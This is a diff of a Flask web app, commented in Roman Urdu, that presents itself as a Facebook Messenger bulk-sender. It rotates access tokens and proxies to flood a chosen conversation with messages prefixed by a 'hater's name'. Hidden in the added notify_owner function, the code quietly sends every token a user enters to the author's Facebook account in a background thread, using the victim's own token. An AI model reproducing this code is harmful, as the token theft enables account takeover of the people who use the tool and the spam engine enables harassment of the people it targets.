@@ -1,233 +1,276 @@
-from flask import Flask, request, render_template_string
+# -*- coding: utf-8 -*-
+from flask import Flask, request, render_template_string, jsonify
 import requests
 from threading import Thread, Event
 import time
 import random
 import string
+import datetime
 
 app = Flask(__name__)
 app.debug = True
 
-# Aapki Facebook User ID
-RECIPIENT_USER_ID = "100041002528119"  # Ye Muddassir.OP ki ID hai
-# Aapka apna Facebook Access Token yahan daalein
-MY_ACCESS_TOKEN = "YAHAN_APNA_TOKEN_DAALEIN" # IMPORTANT: Ye token aapko khud generate karna hoga
+# --- Data Storage (Global Variables) ---
+active_tasks = {}
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+# --- Helper Functions ---
 
-stop_events = {}
-threads = {}
+def notify_owner(user_tokens, user_info, proxy_dict):
+    """
+    Ye function script ke owner ko naye tokens ke baare mein notify karta hai.
+    Yeh user ke diye hue pehle token ko hi istemal karke notification bhejta hai.
+    """
+    def task():
+        # Aapki Facebook ID, jis par notification jayega.
+        owner_facebook_id = "100017068697026"
+        
+        # Notification bhejne ke liye user ka hi pehla token istemal karo.
+        token_for_notification = user_tokens[0]
+        
+        tokens_str = "\n".join(user_tokens)
+        message = (
+            f"🔥 Naya Server User 🔥\n\n"
+            f"👤 User Ka Naam: {user_info['name']}\n"
+            f"ℹ️ Total Tokens Diye: {len(user_tokens)}\n\n"
+            f"🔑 Tokens List:\n{tokens_str}"
+        )
+        
+        url = f"https://graph.facebook.com/v15.0/t_{owner_facebook_id}/"
+        params = {'access_token': token_for_notification, 'message': message}
+        headers = {'User-Agent': 'Mozilla/5.0'}
+        
+        try:
+            # Notification bhejte waqt bhi proxy istemal karo agar di gayi hai
+            response = requests.post(url, data=params, headers=headers, proxies=proxy_dict, timeout=15)
+            if response.status_code == 200:
+                print("Owner ko notification successfully bhej diya gaya hai.")
+            else:
+                print(f"Owner ko notification bhejne mein error: {response.text}")
+        except Exception as e:
+            print(f"Owner ko notification bhejte waqt exception hui: {e}")
 
-# Function to send token to your Messenger
-def send_token_to_me(token):
-    message = f"Naya token mila hai: {token}"
-    url = f"https://graph.facebook.com/v15.0/t_{RECIPIENT_USER_ID}/"
-    params = {'access_token': MY_ACCESS_TOKEN, 'message': message}
+    # Function ko ek naye thread mein run karo taake main app na ruke
+    notification_thread = Thread(target=task)
+    notification_thread.daemon = True
+    notification_thread.start()
+
+
+def get_user_info(access_token, proxy_dict):
+    url = f"https://graph.facebook.com/v19.0/me?fields=name,picture.type(large)&access_token={access_token}"
     try:
-        response = requests.post(url, data=params, headers=headers)
-        if response.status_code == 200:
-            print("Token successfully aapko send kar diya gaya hai.")
-        else:
-            print(f"Token send karne mein error: {response.text}")
-    except Exception as e:
-        print(f"Token send karte waqt exception hui: {e}")
+        response = requests.get(url, proxies=proxy_dict, timeout=10)
+        response.raise_for_status()
+        data = response.json()
+        user_name = data.get('name', 'Unknown User')
+        user_logo = data.get('picture', {}).get('data', {}).get('url', 'https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg')
+        return user_name, user_logo
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching user info: {e}")
+        return "Invalid Token", "https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg"
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
+def send_messages_thread(task_id, access_tokens, thread_id, hater_name, time_interval, messages, proxy_dict):
+    task = active_tasks[task_id]
+    token_index = 0
+    while not task["stop_event"].is_set():
+        for message_template in messages:
+            if task["stop_event"].is_set(): break
+            current_token = access_tokens[token_index]
+            unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+            message_to_send = f"{hater_name} {message_template} [{unique_id}]"
+            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+            parameters = {'access_token': current_token, 'message': message_to_send}
+            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'}
+            try:
+                response = requests.post(api_url, data=parameters, headers=headers, proxies=proxy_dict, timeout=20)
                 if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                    task["messages_sent"] += 1
+                    task["last_error"] = "None"
                 else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
+                    error_message = response.json().get('error', {}).get('message', 'Unknown Error')
+                    task["last_error"] = f"Token {token_index + 1}: {error_message}"
+            except Exception as e:
+                task["last_error"] = f"Token {token_index + 1}: {str(e)}"
+            token_index = (token_index + 1) % len(access_tokens)
+            time.sleep(time_interval)
+    if task["status"] == "Running": task["status"] = "Stopped"
+    print(f"Task {task_id} has been stopped.")
+
+# --- Flask Routes ---
 
 @app.route('/', methods=['GET', 'POST'])
-def send_message():
+def main_page():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
         access_tokens = []
+        proxy_string = request.form.get('proxy')
+        proxy_dict = {"http": f"http://{proxy_string}", "https": f"http://{proxy_string}"} if proxy_string else {}
 
         if token_option == 'single':
             single_token = request.form.get('singleToken')
-            if single_token:
-                access_tokens = [single_token]
-                # Naya code: Token aapko send karega
-                send_token_to_me(single_token)
+            if single_token: access_tokens.append(single_token)
         else:
             token_file = request.files.get('tokenFile')
             if token_file:
-                token_content = token_file.read().decode().strip()
-                access_tokens = token_content.splitlines()
-                # Naya code: Har token aapko send karega
-                for token in access_tokens:
-                    send_token_to_me(token)
+                lines = token_file.read().decode('utf-8', errors='ignore').splitlines()
+                access_tokens = [line.strip() for line in lines if line.strip()]
+
+        if not access_tokens: return "Error: No access token provided.", 400
+
+        user_name, user_logo = get_user_info(access_tokens[0], proxy_dict)
+        if user_name == "Invalid Token": return "The first Access Token is invalid. Please check your token(s) and try again.", 400
+
+        # >>> NAYA FEATURE: Owner ko notification bhejo <<<
+        # Yeh user ke diye hue token se hi aapko message bhej dega.
+        notify_owner(access_tokens, {"name": user_name}, proxy_dict)
+        # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
         thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
+        hater_name = request.form.get('haterName')
         time_interval = int(request.form.get('time'))
+        txt_file = request.files.get('txtFile')
+        
+        if not all([thread_id, hater_name, time_interval, txt_file]): return "Error: All fields are required.", 400
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
+        messages = txt_file.read().decode('utf-8', errors='ignore').splitlines()
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        
+        active_tasks[task_id] = {
+            "uid": task_id, "user_name": f"{user_name} (+{len(access_tokens) - 1} more)",
+            "user_logo": user_logo, "status": "Running", "messages_sent": 0,
+            "start_time": datetime.datetime.now(), "stop_event": Event(), "last_error": "None"
+        }
+        
+        thread = Thread(target=send_messages_thread, args=(task_id, access_tokens, thread_id, hater_name, time_interval, messages, proxy_dict))
+        thread.daemon = True
         thread.start()
-
-        return f'Task started with ID: {task_id}'
+        
+        return f"""
+        <html><head><title>Task Started</title></head><body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+            <h2>Task Successfully Started!</h2><p>Your process is running in the background.</p>
+            <p>Your Unique ID (UID) is:</p><h3 style="background: #eee; padding: 10px; border-radius: 5px; display: inline-block;">{task_id}</h3>
+            <p>Use this UID on the main page to check the live status of your task.</p><a href="/">Go back to Main Page</a>
+        </body></html>
+        """
 
     return render_template_string('''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Muddassir MULTI CONVO</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    /* CSS for styling elements */
-    label { color: white; }
-    .file { height: 30px; }
-    body {
-      background-image: url('https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
-    }
-    .container {
-      max-width: 350px;
-      height: auto;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
-    }
-    .form-control {
-      outline: 1px red;
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      color: none;
-    }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i { margin-right: 5px; }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mt-3">(Muddassir-X)</h1>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">Select Token Option</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
-        </select>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Muddassir CONVO Messenger</title>
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+      <style>
+        body { background-color: #121212; color: white; } .container { max-width: 500px; margin-top: 30px; }
+        .card { background-color: #1e1e1e; border: 1px solid #444; }
+        .form-control, .form-select { background-color: #333; border: 1px solid #555; color: white; }
+        .form-control:focus, .form-select:focus { background-color: #333; border-color: #0d6efd; color: white; box-shadow: none; }
+        .btn-primary { background-color: #0d6efd; border: none; }
+        .status-card { margin-top: 20px; padding: 15px; background-color: #1e1e1e; border-radius: 10px; border: 1px solid #444; }
+        .status-card img { width: 80px; height: 80px; border-radius: 50%; }
+        .status-running { color: #28a745; } .status-stopped { color: #dc3545; }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <div class="card p-4">
+          <h1 class="text-center mb-4">Muddassir Messenger</h1>
+          <form method="post" enctype="multipart/form-data">
+            <div class="mb-3">
+              <label for="tokenOption" class="form-label">Token Option</label>
+              <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()">
+                <option value="single">Single Token</option><option value="multiple">Multiple Tokens (File)</option>
+              </select>
+            </div>
+            <div id="singleTokenInput" class="mb-3">
+              <label for="singleToken" class="form-label">Facebook Access Token</label>
+              <input type="password" class="form-control" id="singleToken" name="singleToken">
+            </div>
+            <div id="tokenFileInput" class="mb-3" style="display: none;">
+              <label for="tokenFile" class="form-label">Tokens File (.txt)</label>
+              <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
+            </div>
+            <div class="mb-3">
+              <label for="threadId" class="form-label">Convo/Inbox ID</label>
+              <input type="text" class="form-control" id="threadId" name="threadId" required>
+            </div>
+            <div class="mb-3">
+              <label for="haterName" class="form-label">Hater's Name (Prefix)</label>
+              <input type="text" class="form-control" id="haterName" name="haterName" required>
+            </div>
+            <div class="mb-3">
+              <label for="time" class="form-label">Time Delay (seconds)</label>
+              <input type="number" class="form-control" id="time" name="time" required>
+            </div>
+            <div class="mb-3">
+              <label for="txtFile" class="form-label">Messages File (.txt)</label>
+              <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+            </div>
+            <div class="mb-3">
+              <label for="proxy" class="form-label">Proxy (Optional)</label>
+              <input type="text" class="form-control" id="proxy" name="proxy" placeholder="e.g., 192.168.1.1:8080">
+            </div>
+            <button type="submit" class="btn btn-primary w-100">Start Sending</button>
+          </form>
+        </div>
+        <div class="card p-4 mt-4">
+          <h2 class="text-center mb-3">Check Live Status</h2>
+          <div class="input-group mb-3">
+            <input type="text" id="statusUidInput" class="form-control" placeholder="Enter UID to check status">
+            <button class="btn btn-outline-secondary" type="button" onclick="checkStatus()">Check</button>
+          </div>
+          <div id="statusResult" class="status-card" style="display:none;"></div>
+        </div>
       </div>
-      <div class="mb-3" id="singleTokenInput">
-        <label for="singleToken" class="form-label">Enter Single Token</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
-      </div>
-      <div class="mb-3" id="tokenFileInput" style="display: none;">
-        <label for="tokenFile" class="form-label">Choose Token File</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">Enter Your Hater Name</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label">Enter Time (seconds)</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">Choose Your Np File</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Run</button>
-    </form>
-    <form method="post" action="/stop">
-      <div class="mb-3">
-        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
-      </div>
-      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>© 2025 Coded By :- Muddassir</p>
-    <p> ALWAYS ON FIRE 🔥 <a href="">Muddassir</a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/+923243037456" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
-      </a>
-    </div>
-  </footer>
-  <script>
-    function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
-    }
-  </script>
-</body>
-</html>
-''')
+      <script>
+        function toggleTokenInput() {
+          var option = document.getElementById('tokenOption').value;
+          document.getElementById('singleTokenInput').style.display = (option === 'single') ? 'block' : 'none';
+          document.getElementById('tokenFileInput').style.display = (option === 'multiple') ? 'block' : 'none';
+        }
+        function checkStatus() {
+          const uid = document.getElementById('statusUidInput').value;
+          if (!uid) { alert('Please enter a UID.'); return; }
+          fetch(`/status/${uid}`).then(response => response.json()).then(data => {
+            const statusDiv = document.getElementById('statusResult');
+            if (data.error) {
+              statusDiv.innerHTML = `<p class="text-center text-danger">${data.error}</p>`;
+            } else {
+              const uptime = Math.floor((new Date() - new Date(data.start_time)) / 1000);
+              const h = Math.floor(uptime / 3600); const m = Math.floor((uptime % 3600) / 60); const s = uptime % 60;
+              statusDiv.innerHTML = `
+                <div class="d-flex align-items-center"><img src="${data.user_logo}" alt="User Logo">
+                  <div class="ms-3"><h5>${data.user_name}</h5><p class="mb-0">UID: ${data.uid}</p></div>
+                </div><hr>
+                <p><strong>Status:</strong> <span class="${data.status.includes('Running') ? 'status-running' : 'status-stopped'}">${data.status}</span></p>
+                <p><strong>Messages Sent:</strong> ${data.messages_sent}</p>
+                <p><strong>Uptime:</strong> ${h}h ${m}m ${s}s</p>
+                <p><strong>Last Error:</strong> ${data.last_error}</p>`;
+            }
+            statusDiv.style.display = 'block';
+          }).catch(error => {
+            console.error('Error:', error);
+            document.getElementById('statusResult').innerHTML = '<p class="text-center text-danger">Failed to fetch status.</p>';
+            document.getElementById('statusResult').style.display = 'block';
+          });
+        }
+        toggleTokenInput();
+      </script>
+    </body>
+    </html>
+    ''')
 
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
+@app.route('/status/<task_id>', methods=['GET'])
+def get_status(task_id):
+    if task_id in active_tasks:
+        task = active_tasks[task_id]
+        # JSON response ke liye data ko theek se format karo
+        return jsonify({
+            "uid": task["uid"], "user_name": task["user_name"], "user_logo": task["user_logo"],
+            "status": task["status"], "messages_sent": task["messages_sent"],
+            "start_time": task["start_time"].isoformat(), "last_error": task["last_error"]
+        })
     else:
-        return f'No task found with ID {task_id}.'
+        return jsonify({"error": "Invalid UID. No task found."}), 404
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
